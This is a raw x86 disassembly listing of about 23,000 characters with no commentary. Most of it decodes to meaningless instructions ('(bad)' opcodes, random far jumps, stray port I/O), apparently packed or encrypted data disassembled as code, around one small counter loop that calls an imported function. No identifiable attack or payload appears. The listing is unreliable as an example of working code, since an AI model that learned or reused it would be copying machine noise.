  410fc5:	shl    DWORD PTR [edi+eiz*8+0x71516771],cl
  410fcc:	push   ebp
  410fcd:	paddsw mm6,QWORD PTR [eax-0xbd392]
  410fd4:	es dec esi
  410fd6:	jo     0x411048
  410fd8:	pop    eax
  410fd9:	jge    0x41104b
  410fdb:	jo     0x411049
  410fdd:	push   ebx
  410fde:	mov    ah,0x14
  410fe0:	scas   al,BYTE PTR es:[edi]
  410fe1:	outs   dx,BYTE PTR ds:[esi]
  410fe2:	out    0x9d,al
  410fe4:	mov    ch,0x95
  410fe6:	jg     0x411029
  410fe8:	xchg   BYTE PTR [edx+0x3c],bl
  410feb:	pop    esi
  410fec:	push   eax
  410fed:	mov    esp,0xe1930df
  410ff2:	dec    esp
  410ff3:	in     eax,dx
  410ff4:	(bad)  
  410ff6:	fsincos 
  410ff8:	(bad)  
  410ff9:	jecxz  0x410fcd
  410ffb:	imul   eax,esp,0xb80839e6
  411001:	fnstcw WORD PTR [edx]
  411003:	cmp    DWORD PTR [esi+0x60],edx
  411006:	rcl    BYTE PTR [edi+0x203716f4],1
  41100c:	aad    0x84
  41100e:	fstp   QWORD PTR [ecx+esi*2]
  411011:	ja     0x410fd6
  411013:	push   0x67b7ef23
  411018:	or     BYTE PTR [edx+0x530d0c6d],bh
  41101e:	pop    ds
  41101f:	scas   eax,DWORD PTR es:[edi]
  411020:	ins    BYTE PTR es:[edi],dx
  411021:	mov    cl,0x11
  411023:	mov    edx,0x20ddddcf
  411028:	pushf  
  411029:	add    dl,BYTE PTR [ebx+0x3e07d79c]
  41102f:	fxch   st(5)
  411031:	iret   
  411032:	ret    0x6ec5
  411035:	pop    ds
  411036:	jge    0x411020
  411038:	inc    esi
  411039:	out    0xc0,eax
  41103b:	fld    TBYTE PTR [eax+0x7c]
  41103e:	test   eax,esp
  411040:	fsubp  st(4),st
  411042:	adc    dl,al
  411044:	popa   
  411045:	inc    ebx
  411046:	pop    ebx
  411047:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411048:	repnz mov esp,0x9b516b2b
  41104e:	push   esp
  41104f:	cs cld 
  411051:	pop    edi
  411052:	sahf   
  411053:	ffreep st(1)
  411055:	mov    edi,0xc9c7cd10
  41105a:	in     eax,0xfa
  41105c:	dec    esp
  41105d:	ret    0x71e5
  411060:	mov    ebx,0x38f64344
  411065:	mov    ch,0x40
  411067:	test   ebx,ebp
  411069:	int    0xad
  41106b:	or     ebx,ebx
  41106d:	test   BYTE PTR [esi],bh
  41106f:	lods   eax,DWORD PTR ds:[esi]
  411070:	adc    dh,BYTE PTR [esi-0x48]
  411073:	xchg   BYTE PTR [esi+ebx*1+0x728b1849],cl
  41107a:	out    0x5b,eax
  41107c:	(bad)  
  41107d:	bound  esp,QWORD PTR [eax+0x0]
  411080:	and    BYTE PTR [eax-0x21cf4eb],0x6e
  411087:	jmp    0x297d:0xcad15cc4
  41108e:	or     al,0x2
  411090:	and    BYTE PTR [edi+0x24a501c7],cl
  411096:	loopne 0x411023
  411098:	xchg   edx,eax
  411099:	cmp    al,0x76
  41109b:	cmp    ah,BYTE PTR [esi+edi*2+0x71]
  41109f:	fcmove st,st(4)
  4110a1:	mov    dl,0x54
  4110a3:	mov    esi,0x2983378c
  4110a8:	fwait
  4110a9:	cmp    DWORD PTR ds:0xe0c43afb,esp
  4110af:	pop    edi
  4110b0:	fdivr  st(4),st
  4110b2:	idiv   DWORD PTR [ebx]
  4110b4:	pop    ds
  4110b5:	inc    eax
  4110b6:	call   DWORD PTR [edi+edi*1+0x6b4d309b]
  4110bd:	outs   dx,BYTE PTR ds:[esi]
  4110be:	jmp    0x4110ea
  4110c0:	sar    BYTE PTR [esi-0x1034f1a8],0x4b
  4110c7:	pushf  
  4110c8:	sbb    edx,edx
  4110ca:	call   0x8902f950
  4110cf:	mov    eax,ds:0x379c878f
  4110d4:	arpl   WORD PTR [ebp-0x7a],si
  4110d7:	outs   dx,DWORD PTR ds:[esi]
  4110d8:	iret   
  4110d9:	jb     0x41108e
  4110db:	jo     0x41109e
  4110dd:	jo     0x4110f6
  4110df:	xchg   bl,dl
  4110e1:	repz sbb DWORD PTR [ebp+0x23dae5],esi
  4110e8:	pusha  
  4110e9:	sub    esi,DWORD PTR [eax+0x6d]
  4110ec:	cdq    
  4110ed:	dec    esi
  4110ee:	pop    ss
  4110ef:	mov    edi,0xb3f02ef5
  4110f4:	add    al,0x22
  4110f6:	mov    ebx,0xb2c0364c
  4110fb:	pop    ss
  4110fc:	mov    dl,0x2
  4110fe:	and    edx,esi
  411100:	test   bl,0x62
  411103:	mov    dh,al
  411105:	aam    0x29
  411107:	pushf  
  411108:	push   ds
  411109:	xchg   ebp,eax
  41110a:	out    0x16,al
  41110c:	out    dx,al
  41110d:	sub    esi,esp
  41110f:	pop    ebp
  411110:	inc    eax
  411111:	add    ebx,DWORD PTR [edx]
  411113:	mov    al,ds:0x13997dcc
  411118:	pop    es
  411119:	jae    0x4110b3
  41111b:	out    dx,eax
  41111c:	push   ecx
  41111d:	dec    edi
  41111e:	mov    bl,0xa9
  411120:	enter  0xd67f,0x7f
  411124:	call   0xef93:0xae641e56
  41112b:	jp     0x4110e2
  41112d:	dec    edi
  41112e:	rol    DWORD PTR [eax+0x395b6cbe],cl
  411134:	pop    esi
  411135:	dec    ecx
  411136:	faddp  st(0),st
  411138:	shl    bl,0xa
  41113b:	sbb    DWORD PTR [eax+ecx*4],esi
  41113e:	bound  ebx,QWORD PTR [edx]
  411140:	push   esp
  411141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411142:	or     al,0x72
  411144:	mov    eax,ds:0x91f1099b
  411149:	iretw  
  41114b:	shl    DWORD PTR [eax-0x32],0x25
  41114f:	das    
  411150:	xchg   ebp,eax
  411151:	cmp    eax,0xe7716cbb
  411156:	je     0x41115a
  411158:	arpl   WORD PTR [ecx+0x69baad47],di
  41115e:	out    dx,eax
  41115f:	int    0x63
  411161:	scas   al,BYTE PTR es:[edi]
  411162:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411163:	or     DWORD PTR cs:[edi],eax
  411166:	mov    bl,0x70
  411168:	outs   dx,BYTE PTR ds:[esi]
  411169:	sbb    eax,0xa5d55651
  41116e:	xor    eax,edi
  411170:	fnstenv [eax]
  411172:	cli    
  411173:	ins    BYTE PTR es:[edi],dx
  411174:	xchg   esi,eax
  411175:	cmp    DWORD PTR [esi-0x5],edx
  411178:	push   esi
  411179:	imul   ebp,ecx,0x5a17929
  41117f:	add    al,0x19
  411181:	cmp    BYTE PTR [eax-0x52caa089],dh
  411187:	fdivr  QWORD PTR ds:0x67b960f4
  41118d:	repz ret 
  41118f:	cdq    
  411190:	into   
  411191:	loop   0x411138
  411193:	rcr    DWORD PTR [eax+0xd],0x49
  411197:	lods   eax,DWORD PTR ds:[esi]
  411198:	cmp    eax,0xa5ee0c6b
  41119d:	out    0xbf,eax
  41119f:	add    bh,BYTE PTR [ecx+esi*2]
  4111a2:	fidiv  WORD PTR [esi-0x36b71cfc]
  4111a8:	xor    dl,bl
  4111aa:	inc    eax
  4111ab:	std    
  4111ac:	pop    edi
  4111ad:	mov    ?,eax
  4111af:	add    eax,0xf1b9d992
  4111b4:	xchg   ebx,eax
  4111b5:	and    ah,ah
  4111b7:	outs   dx,DWORD PTR ds:[esi]
  4111b8:	jle    0x411184
  4111ba:	imul   ebx,DWORD PTR [ebp-0x527b2e8f],0x4b
  4111c1:	sbb    ecx,DWORD PTR [ebx]
  4111c3:	iret   
  4111c4:	jmp    0x41115b
  4111c6:	jbe    0x411172
  4111c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4111c9:	inc    esp
  4111ca:	repnz ss push esi
  4111cd:	mov    esp,0xf76624c2
  4111d2:	xchg   esp,eax
  4111d3:	xor    al,0x83
  4111d5:	outs   dx,DWORD PTR ds:[esi]
  4111d6:	int    0x93
  4111d8:	mov    eax,ds:0x3003560c
  4111dd:	nop
  4111de:	aam    0xcd
  4111e0:	idiv   BYTE PTR [ecx+ecx*2-0x18]
  4111e4:	retf   
  4111e5:	ret    0xf40d
  4111e8:	cs pop eax
  4111ea:	mov    ebx,0x271f9888
  4111ef:	scas   al,BYTE PTR es:[edi]
  4111f0:	clc    
  4111f1:	adc    al,0x4d
  4111f3:	xchg   BYTE PTR [ecx+0x11b65af2],ah
  4111f9:	lea    ebx,ds:0x5ef52c47
  4111ff:	rol    DWORD PTR [ecx+0x67],1
  411202:	mov    al,ds:0x84d9386a
  411207:	mov    al,dl
  411209:	dec    edx
  41120a:	dec    esi
  41120b:	shl    DWORD PTR [ecx+eax*8+0x1ba5ac80],0x89
  411213:	sub    al,0x4b
  411215:	retf   
  411216:	in     eax,dx
  411217:	push   eax
  411218:	jmp    0x411261
  41121a:	stos   DWORD PTR es:[edi],eax
  41121b:	adc    DWORD PTR [ebp-0x76180963],ecx
  411221:	mov    DWORD PTR [ecx-0x3b],eax
  411224:	je     0x4111d8
  411226:	cmp    ecx,DWORD PTR [eax-0x7f37a2b0]
  41122c:	push   edx
  41122d:	cmp    DWORD PTR [esi+0x44dd3818],esp
  411233:	ds dec esp
  411235:	aaa    
  411236:	cdq    
  411237:	jae    0x411253
  411239:	gs pop edx
  41123b:	cmp    ch,BYTE PTR [ebx-0xf]
  41123e:	inc    ebp
  41123f:	into   
  411240:	push   esi
  411241:	aaa    
  411242:	(bad)  
  411244:	xchg   ah,bl
  411246:	js     0x411226
  411248:	xlat   BYTE PTR ds:[ebx]
  411249:	retf   0x1f79
  41124c:	adc    cl,bl
  41124e:	add    DWORD PTR [ebx+0x41],eax
  411251:	popa   
  411252:	jb     0x411215
  411254:	lea    ebx,ds:0xc6a5f460
  41125a:	dec    eax
  41125b:	push   ds
  41125c:	call   0xea7a:0x6805150f
  411263:	js     0x4112d2
  411265:	sub    eax,0x8bfb212a
  41126a:	adc    eax,0x8282d2a5
  41126f:	mov    al,ds:0xcca2cb21
  411274:	mov    bh,0x5f
  411276:	pop    eax
  411277:	mov    fs,WORD PTR [esi]
  411279:	dec    esi
  41127a:	mov    esi,0xdc4e15d1
  41127f:	popa   
  411280:	mov    ecx,0x490395b1
  411285:	jae    0x411286
  411287:	push   cs
  411288:	sbb    DWORD PTR [ebx],edi
  41128a:	(bad)  
  41128b:	ds into 
  41128d:	sub    ah,0x55
  411290:	je     0x4112ec
  411292:	push   eax
  411293:	cli    
  411294:	xor    eax,0x168a0272
  411299:	mov    al,0xf6
  41129b:	gs mov ch,0x1b
  41129e:	sbb    eax,0x4f116970
  4112a3:	cmp    al,0xd1
  4112a5:	mov    bh,0x2e
  4112a7:	xchg   ebx,eax
  4112a8:	jbe    0x411326
  4112aa:	or     ch,al
  4112ac:	mov    bl,0x2f
  4112ae:	and    eax,0x9182ea7e
  4112b3:	test   BYTE PTR [edx-0x3a66e77b],al
  4112b9:	mov    esi,0x796e6e06
  4112be:	xchg   edi,eax
  4112bf:	(bad)  
  4112c1:	sbb    al,BYTE PTR [esi-0x76d92006]
  4112c7:	and    al,0xbf
  4112c9:	adc    DWORD PTR [edi],0x48
  4112cc:	cld    
  4112cd:	dec    edx
  4112ce:	cmp    ah,BYTE PTR [ecx+0x5b]
  4112d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4112d2:	push   edx
  4112d3:	int3   
  4112d4:	jo     0x411340
  4112d6:	sbb    DWORD PTR [ebp+0x2a],ecx
  4112d9:	xchg   DWORD PTR [edi],esp
  4112db:	retf   
  4112dc:	xor    ch,BYTE PTR [edx]
  4112de:	jne    0x411324
  4112e0:	jnp    0x41135d
  4112e2:	ret    
  4112e3:	leave  
  4112e4:	or     ecx,esi
  4112e6:	dec    ebx
  4112e7:	push   esi
  4112e8:	dec    ecx
  4112e9:	rcl    DWORD PTR [eax+0x6a],0x15
  4112ed:	imul   ebx,DWORD PTR [edx],0x63011b75
  4112f3:	retf   0xb397
  4112f6:	out    0x71,al
  4112f8:	inc    ebp
  4112f9:	jg     0x411284
  4112fb:	and    al,0xae
  4112fd:	(bad)  
  4112fe:	sub    esi,DWORD PTR [ecx-0x4b]
  411301:	cmova  ecx,esi
  411304:	in     al,0x5
  411306:	rol    esi,0xac
  411309:	ins    BYTE PTR es:[edi],dx
  41130a:	pop    ss
  41130b:	jne    0x411366
  41130d:	mov    dl,0xcb
  41130f:	shl    BYTE PTR [eax-0x55107c02],1
  411315:	cmp    DWORD PTR [edi-0x59],ebx
  411318:	es xchg ebx,eax
  41131a:	sbb    DWORD PTR [edx-0x78c29263],0x4fca3ed0
  411324:	loopne 0x41132a
  411326:	inc    ecx
  411327:	or     DWORD PTR [ecx-0x71df002d],ebp
  41132d:	jns    0x411308
  41132f:	push   esi
  411330:	jno    0x4112ca
  411332:	add    ecx,ebp
  411334:	dec    ebp
  411335:	xor    DWORD PTR [esi-0x7e455464],edx
  41133b:	mov    esi,0x2c395933
  411340:	adc    eax,0x300302aa
  411346:	push   edx
  411347:	je     0x4112ef
  411349:	shl    cl,1
  41134b:	pop    es
  41134c:	mov    eax,ds:0xcb1fba87
  411351:	mov    bh,0x8a
  411353:	in     al,dx
  411354:	fwait
  411355:	repnz sub DWORD PTR [edi+0x916b347],ebp
  41135c:	jl     0x411329
  41135e:	pop    es
  41135f:	jne    0x411371
  411361:	xor    DWORD PTR [esi+0x1f0aa688],ecx
  411367:	sub    al,0x18
  411369:	mov    ?,edi
  41136b:	pop    eax
  41136c:	repnz xchg bl,cl
  41136f:	lock lods eax,DWORD PTR ds:[esi]
  411371:	pop    ebp
  411372:	ins    DWORD PTR es:[edi],dx
  411373:	test   DWORD PTR [eax-0x564cfb1a],ecx
  411379:	cmc    
  41137a:	inc    edx
  41137b:	or     al,dh
  41137d:	je     0x4113b5
  41137f:	(bad)  
  411380:	cmp    eax,0x5c87ec98
  411385:	sahf   
  411386:	fs mov esi,0x74e2bb28
  41138c:	clc    
  41138d:	xchg   ebx,eax
  41138e:	mov    al,BYTE PTR [esi+0x17540b40]
  411394:	repz aas 
  411396:	or     BYTE PTR [edx],al
  411398:	adc    cl,dl
  41139a:	sub    ecx,esi
  41139c:	pushf  
  41139d:	out    dx,al
  41139e:	push   ds
  41139f:	scas   al,BYTE PTR es:[edi]
  4113a0:	scas   eax,DWORD PTR es:[edi]
  4113a1:	hlt    
  4113a2:	xchg   esi,eax
  4113a3:	mov    dl,0x87
  4113a5:	adc    al,0xfd
  4113a7:	call   0x1049630e
  4113ac:	pop    es
  4113ad:	arpl   WORD PTR [ecx-0x52],bx
  4113b0:	stos   BYTE PTR es:[edi],al
  4113b1:	push   es
  4113b2:	test   eax,0x8f3cf3fe
  4113b7:	in     eax,0xb4
  4113b9:	lds    ecx,FWORD PTR [ebp-0x3cccd19e]
  4113bf:	cmp    BYTE PTR [edi-0x48],bh
  4113c2:	sbb    edi,edi
  4113c4:	cmp    eax,esi
  4113c6:	mov    DWORD PTR ds:0x42fdf1,0x78e4
  4113d0:	je     0x411c9a
  4113d6:	mov    eax,ds:0x41b224
  4113db:	and    DWORD PTR ds:0x42fe7a,0x0
  4113e5:	mov    esi,DWORD PTR ds:0x42fe7a
  4113eb:	inc    esi
  4113ec:	mov    DWORD PTR ds:0x42fe7a,esi
  4113f2:	cmp    DWORD PTR ds:0x42fe7a,0x8
  4113f9:	jne    0x41140f
  4113ff:	push   0x42e2e7
  411404:	push   0x42e36d
  411409:	call   DWORD PTR ds:0x42e667
  41140f:	cmp    DWORD PTR ds:0x42fe7a,0x7
  411416:	jne    0x411429
  41141c:	mov    esi,DWORD PTR ds:0x42fe7a
  411422:	inc    esi
  411423:	mov    DWORD PTR ds:0x42fe7a,esi
  411429:	cmp    DWORD PTR ds:0x42fe7a,0x13
  411430:	jb     0x4113e5
  411436:	jmp    0x41183b
  41143b:	and    cl,al
  41143d:	leave  
  41143e:	adc    ch,cl
  411440:	adc    ecx,esp
  411442:	call   0xcb53bead
  411447:	repnz out dx,eax
  411449:	xor    bh,BYTE PTR [esi+ecx*1+0x4a]
  41144d:	jo     0x4114bf
  41144f:	pop    eax
  411450:	jge    0x4114c2
  411452:	jo     0x4113fb
  411454:	inc    esi
  411455:	jl     0x411430
  411457:	push   cs
  411458:	mov    ?,WORD PTR [ebx-0x823d751]
  41145e:	inc    ebx
  41145f:	xchg   esp,eax
  411460:	add    al,ch
  411462:	clc    
  411463:	adc    eax,0xe5e63410
  411468:	pop    ss
  411469:	mov    edi,esi
  41146b:	mov    ecx,0x22a36bc0
  411470:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411471:	xor    DWORD PTR [eax+ecx*2+0x49],esi
  411475:	xchg   BYTE PTR [eax-0x43],al
  411478:	jae    0x4114b0
  41147a:	add    DWORD PTR [ecx+0x66dcde6e],esi
  411480:	das    
  411481:	adc    bl,BYTE PTR [ebx+0xf990b7e]
  411487:	mov    ebp,0xa6bbd6fb
  41148c:	push   ebp
  41148d:	jp     0x411479
  41148f:	pop    esp
  411490:	adc    DWORD PTR [edi-0x7f],edi
  411493:	enter  0x1324,0x7
  411497:	inc    esp
  411498:	dec    eax
  411499:	lea    ebx,[ecx-0x7a]
  41149c:	ret    
  41149d:	pop    es
  41149e:	push   ebx
  41149f:	loop   0x411473
  4114a1:	inc    edi
  4114a2:	xchg   esi,eax
  4114a3:	cmp    al,BYTE PTR [edx]
  4114a5:	in     al,0x1
  4114a7:	mov    bl,0x31
  4114a9:	xchg   DWORD PTR [ecx+eiz*8-0x59],eax
  4114ad:	or     eax,0x79d1b3fc
  4114b2:	inc    ebx
  4114b3:	push   ss
  4114b4:	rol    DWORD PTR [eax-0x6f],0x7d
  4114b8:	loope  0x411492
  4114ba:	push   esp
  4114bb:	sub    bl,cl
  4114bd:	xor    edx,DWORD PTR [edi+0x238b7dc1]
  4114c3:	stos   WORD PTR es:[edi],ax
  4114c5:	jnp    0x411529
  4114c7:	sub    esi,DWORD PTR [eax]
  4114c9:	ja     0x411459
  4114cb:	pop    edi
  4114cc:	out    0xc3,eax
  4114ce:	xchg   esp,eax
  4114cf:	dec    ebx
  4114d0:	push   ds
  4114d1:	lea    esp,[eax]
  4114d3:	retf   
  4114d4:	sbb    ch,BYTE PTR [ebx-0x4]
  4114d7:	scas   al,BYTE PTR es:[edi]
  4114d8:	jmp    0x12019d38
  4114dd:	adc    DWORD PTR ds:0x1b0c8341,ebx
  4114e3:	loopne 0x41153d
  4114e5:	pushf  
  4114e6:	fs pusha 
  4114e8:	xchg   esi,eax
  4114e9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114ea:	cli    
  4114eb:	arpl   WORD PTR [ecx-0x26],sp
  4114ee:	icebp  
  4114ef:	mov    esp,0x532d09f8
  4114f4:	test   DWORD PTR [ecx+eax*2-0x179ba7a2],ebp
  4114fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4114fc:	pop    edx
  4114fd:	pop    ss
  4114fe:	xchg   ebp,eax
  4114ff:	lock sar DWORD PTR [eax-0x42],cl
  411503:	ja     0x41153a
  411505:	test   eax,0xa585a756
  41150a:	xor    dh,ch
  41150c:	jne    0x411539
  41150e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41150f:	cmc    
  411510:	aas    
  411511:	stc    
  411512:	iret   
  411513:	jbe    0x4114cc
  411515:	hlt    
  411516:	daa    
  411517:	sti    
  411518:	inc    ebp
  411519:	mov    ?,edi
  41151b:	cmp    BYTE PTR ds:[edx],bl
  41151e:	inc    esp
  41151f:	xor    al,0x3f
  411521:	test   ah,ah
  411523:	jns    0x411506
  411525:	or     al,BYTE PTR [ebx+ebx*1+0x63]
  411529:	mov    cl,0x8e
  41152b:	adc    BYTE PTR [esi],0x70
  41152e:	dec    BYTE PTR [ecx]
  411530:	jmp    0xdaa:0x3bf5df5a
  411537:	lods   al,BYTE PTR ds:[esi]
  411538:	lods   al,BYTE PTR ds:[esi]
  411539:	jmp    0x41152f
  41153b:	add    edx,0x58
  41153e:	push   ss
  41153f:	push   edi
  411540:	lods   eax,DWORD PTR ds:[esi]
  411541:	xchg   esp,eax
  411542:	ins    DWORD PTR es:[edi],dx
  411543:	jmp    0x4115ab
  411545:	jmp    0xe1ef:0xaed1010f
  41154c:	mov    al,ds:0x3fe5c7e1
  411551:	jne    0x4115a0
  411553:	(bad)  
  411554:	sub    al,BYTE PTR [edi-0x46e33d1d]
  41155a:	add    BYTE PTR [edi],0xe8
  41155d:	inc    esp
  41155e:	pop    eax
  41155f:	pop    eax
  411560:	mov    ds:0x8c902093,al
  411565:	test   BYTE PTR [ecx-0x454dc48c],cl
  41156b:	popa   
  41156c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41156d:	cmp    ebp,ecx
  41156f:	dec    DWORD PTR [ebx-0x70283217]
  411575:	xor    ecx,ebx
  411577:	imul   ebx,DWORD PTR [esi+0x7a],0x12
  41157b:	sbb    al,0xab
  41157d:	sub    cl,BYTE PTR [ecx+0x3e5e9b3e]
  411583:	test   eax,0x396305d1
  411588:	xchg   ebx,eax
  411589:	(bad)  
  41158a:	ficom  WORD PTR [esi+0x21d893c8]
  411590:	and    al,0x4a
  411592:	xor    DWORD PTR [edx],esp
  411594:	xchg   ecx,eax
  411595:	shl    DWORD PTR [edx],1
  411597:	pop    es
  411598:	push   eax
  411599:	xchg   esi,eax
  41159a:	jno    0x41157f
  41159c:	pop    edi
  41159d:	not    ebp
  41159f:	sub    eax,0x2b05b76a
  4115a4:	mov    WORD PTR [eax+ebx*4-0x22],ss
  4115a8:	sti    
  4115a9:	stos   DWORD PTR es:[edi],eax
  4115aa:	popf   
  4115ab:	loope  0x411534
  4115ad:	pushf  
  4115ae:	push   es
  4115af:	dec    eax
  4115b0:	dec    ebx
  4115b1:	pop    eax
  4115b2:	xlat   BYTE PTR ds:[ebx]
  4115b3:	jge    0x4115fc
  4115b5:	inc    esi
  4115b6:	cld    
  4115b7:	pop    esi
  4115b8:	add    BYTE PTR [edi],0x29
  4115bb:	jne    0x41161c
  4115bd:	adc    eax,0x3baf5539
  4115c2:	retf   
  4115c3:	cld    
  4115c4:	hlt    
  4115c5:	add    DWORD PTR [edi+0xf],edi
  4115c8:	int3   
  4115c9:	jecxz  0x4115d8
  4115cb:	sub    eax,0x6e0c9b73
  4115d0:	das    
  4115d1:	test   BYTE PTR [eax+esi*1-0x640dc62d],0x22
  4115d9:	and    al,0x34
  4115db:	mov    al,ah
  4115dd:	ja     0x411650
  4115df:	jne    0x4115b3
  4115e1:	fbstp  TBYTE PTR [esi]
  4115e3:	lea    edx,[edi+edx*4+0x65]
  4115e7:	adc    BYTE PTR [ebp+0x7d],cl
  4115ea:	test   eax,0x3eb87ef8
  4115ef:	dec    ebp
  4115f0:	jecxz  0x411592
  4115f2:	ins    BYTE PTR es:[edi],dx
  4115f3:	push   0x6b
  4115f5:	xor    eax,0x3069519c
  4115fa:	ins    DWORD PTR es:[edi],dx
  4115fb:	sub    esp,DWORD PTR [ecx+0x7c2dd21a]
  411601:	out    0xf3,al
  411603:	sar    DWORD PTR [edx+edx*1-0x2f79b927],cl
  41160a:	inc    edi
  41160b:	fist   WORD PTR [ebp+0x34c03d1c]
  411611:	xchg   edi,eax
  411612:	call   0xaca3:0x55b8c78
  411619:	ja     0x411669
  41161b:	cs ins DWORD PTR es:[edi],dx
  41161d:	arpl   dx,di
  41161f:	int    0x52
  411621:	fdivr  DWORD PTR [edi-0x1e]
  411624:	jnp    0x4115d5
  411626:	scas   eax,DWORD PTR es:[edi]
  411627:	push   0x29
  411629:	into   
  41162a:	pushf  
  41162b:	(bad)  
  41162d:	sub    eax,0x76344103
  411632:	or     edi,DWORD PTR [ebx]
  411634:	gs (bad) 
  411636:	addr16 aam 0xf3
  411639:	inc    ecx
  41163a:	push   ss
  41163b:	cwde   
  41163c:	adc    eax,0x2f6167b6
  411641:	pop    ebp
  411642:	mov    edx,DWORD PTR [edi-0x61]
  411645:	cld    
  411646:	lock push es
  411648:	mov    esi,0x19340a9f
  41164d:	adc    DWORD PTR [eax+0x3fe325ff],eax
  411653:	sub    DWORD PTR [eax+edi*8],edx
  411656:	(bad)
  41165b:	test   ebx,edx
  41165d:	or     cl,bl
  41165f:	rol    BYTE PTR [esi],0x2e
  411662:	ret    
  411663:	test   al,0x26
  411665:	enter  0x1e5b,0xe0
  411669:	out    dx,al
  41166a:	adc    BYTE PTR [edi],bl
  41166c:	mov    edx,0x809652fd
  411671:	popa   
  411672:	in     eax,0xbc
  411674:	outs   dx,DWORD PTR ds:[esi]
  411675:	(bad)  
  411676:	adc    al,0xcc
  411678:	mov    al,cl
  41167a:	fwait
  41167b:	or     DWORD PTR [ebx],esp
  41167d:	daa    
  41167e:	add    cl,bl
  411680:	pop    es
  411681:	lods   al,BYTE PTR ds:[esi]
  411682:	ins    BYTE PTR es:[edi],dx
  411683:	sbb    dl,BYTE PTR [ebx-0x49]
  411686:	(bad)  
  411687:	les    ebx,FWORD PTR [edi-0x4671d443]
  41168d:	mov    ch,0xdc
  41168f:	push   es
  411690:	inc    esi
  411691:	pusha  
  411692:	sub    ch,bh
  411694:	sbb    dh,BYTE PTR [ebp+0x635c368c]
  41169a:	cli    
  41169b:	test   eax,0x22f03317
  4116a0:	dec    edx
  4116a1:	push   0xffffff9c
  4116a3:	popa   
  4116a4:	fcom   DWORD PTR [esi]
  4116a6:	ret    
  4116a7:	push   edx
  4116a8:	sub    eax,0x9e172343
  4116ad:	fisub  WORD PTR [edx-0x12]
  4116b0:	(bad)  
  4116b1:	js     0x411719
  4116b3:	hlt    
  4116b4:	xchg   esp,esi
  4116b6:	push   ss
  4116b7:	xchg   ebx,eax
  4116b8:	(bad)  
  4116b9:	jp     0x4116ec
  4116bb:	sub    eax,0x5896132f
  4116c0:	gs iret 
  4116c2:	pop    ebx
  4116c3:	fsub   st,st(7)
  4116c5:	and    al,0xc7
  4116c7:	mov    ebp,0xfcfc9e1
  4116cc:	popf   
  4116cd:	dec    esi
  4116ce:	test   DWORD PTR [ebx+0x34],0x194d3a5a
  4116d5:	push   esi
  4116d6:	jg     0x411743
  4116d8:	loope  0x41171b
  4116da:	xchg   edi,eax
  4116db:	push   esp
  4116dc:	imul   eax,ebp,0x35
  4116df:	mov    bl,0xc0
  4116e1:	jne    0x411733
  4116e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116e5:	sub    esp,DWORD PTR [edi]
  4116e7:	sahf   
  4116e8:	or     edx,DWORD PTR [edx]
  4116ea:	push   cs
  4116eb:	out    dx,eax
  4116ec:	and    bh,BYTE PTR [edx+0x58]
  4116ef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116f0:	clc    
  4116f1:	pusha  
  4116f2:	das    
  4116f3:	cwde   
  4116f4:	imul   ecx,DWORD PTR [ecx],0x96a537a8
  4116fa:	add    eax,0xdec412b8
  4116ff:	mov    ch,0xe0
  411701:	jo     0x411685
  411703:	xchg   BYTE PTR [edi],ch
  411705:	int    0xe5
  411707:	retf   0x7d54
  41170a:	adc    DWORD PTR [edi],edi
  41170c:	cmovp  ebx,DWORD PTR [ebx]
  41170f:	out    0x73,eax
  411711:	jnp    0x411752
  411713:	adc    cl,BYTE PTR [ecx]
  411715:	(bad)  ds:0x7d73b2f4
  41171b:	fdiv   QWORD PTR [edx-0x6d]
  41171e:	jl     0x411706
  411720:	xchg   esi,eax
  411721:	pop    ebx
  411722:	dec    bp
  411724:	sbb    DWORD PTR [ecx-0x4e1fbbbc],esp
  41172a:	ds (bad) 
  41172d:	cmc    
  41172e:	mov    al,ds:0x7a18a64f
  411733:	shr    DWORD PTR [ebx+0xb1f892a],0x94
  41173a:	xor    al,BYTE PTR [edx-0x2d1288e8]
  411740:	into   
  411741:	pop    ebx
  411742:	out    0xa2,al
  411744:	ss dec esp
  411746:	or     edx,esi
  411748:	das    
  411749:	dec    ecx
  41174a:	mov    cl,0xfa
  41174c:	and    DWORD PTR cs:[ebx-0xce5c43a],ebx
  411753:	and    BYTE PTR [ebp+ebp*1+0x7eabd5be],bh
  41175a:	sbb    DWORD PTR [ebp-0x59],ecx
  41175d:	jbe    0x4116e2
  41175f:	(bad)  
  411760:	retf   
  411761:	jmp    0xdd1b:0xe1fcadf7
  411768:	div    ch
  41176a:	fcmove st,st(7)
  41176c:	fld    QWORD PTR [ebx-0x2a4afa88]
  411772:	jne    0x41171e
  411774:	loopne 0x41175b
  411776:	or     dh,BYTE PTR [edx]
  411778:	repnz sahf 
  41177a:	adc    cl,cl
  41177c:	sahf   
  41177d:	call   0x78b0793
  411782:	imul   ecx,DWORD PTR [esi-0x3f],0x3ae8466f
  411789:	add    BYTE PTR [ecx-0x3c794617],dl
  41178f:	(bad)  
  411790:	or     edx,DWORD PTR [ebx+0x2417a803]
  411796:	jge    0x4117ca
  411798:	mov    ch,0xf9
  41179a:	cmp    eax,0xf534e60c
  41179f:	int    0xc5
  4117a1:	cmp    eax,0x5784d9a7
  4117a6:	leave  
  4117a7:	xchg   esp,eax
  4117a8:	push   0x65651fca
  4117ad:	mov    dl,BYTE PTR [ebx+esi*8+0x62d9b711]
  4117b4:	dec    esi
  4117b5:	xor    bl,BYTE PTR [ecx-0x38]
  4117b8:	adc    al,0x86
  4117ba:	dec    esp
  4117bb:	mov    eax,ds:0xa85b51c5
  4117c0:	int3   
  4117c1:	push   edi
  4117c2:	scas   eax,DWORD PTR es:[edi]
  4117c3:	stos   DWORD PTR es:[edi],eax
  4117c4:	sar    BYTE PTR [ebx+0x65ab807b],cl
  4117ca:	scas   al,BYTE PTR es:[edi]
  4117cb:	or     ebp,ecx
  4117cd:	lds    esi,FWORD PTR [ebx-0x65]
  4117d0:	cdq    
  4117d1:	push   cs
